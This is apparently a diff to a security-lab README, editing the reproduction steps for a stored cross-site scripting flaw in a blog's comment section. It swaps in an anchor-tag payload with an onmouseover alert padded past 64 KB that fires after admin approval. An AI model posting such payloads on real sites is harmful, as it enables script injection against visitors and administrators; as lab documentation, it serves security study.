@@ -15,7 +15,7 @@ Time spent: 10 hours spent in total
   - [x] Steps to recreate: 
     -  Login as Guest
     - Go on any post down to comment section 
-    - post <'x onmouseover=alert(2)style=position:absolute;left:0;top:0;width:5000px;height:5000px  AAAAAAAAAAAA...[64 kb]..AAA'>
+    - post `<a title='x onmouseover=alert(1) style=position:absolute;left:0;top:0;width:5000px;height:5000px  AAAAAAAAAAAA...[64 kb]..AAA'></a>`
     -  Beware the "A" needs to be 64kbs and over, in order to work. 
     -  Need admin comment approval.
           
